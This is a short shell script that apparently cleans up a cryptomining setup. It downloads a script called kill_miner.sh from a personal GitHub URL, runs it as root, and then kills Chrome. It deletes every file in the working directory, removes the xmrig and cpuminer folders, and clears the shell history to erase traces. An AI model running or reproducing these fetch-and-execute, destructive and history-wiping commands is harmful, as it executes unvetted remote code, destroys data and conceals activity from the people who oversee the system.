#!/bin/sh
wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
chmod +x /root/kill_miner.sh
./kill_miner.sh
sleep 3
/bin/pkill -f "chrome"
rm -fv *
rm -fR cpuminer-opt-linux/
rm -fR xmrig-6.21.0/
history -c && history -w
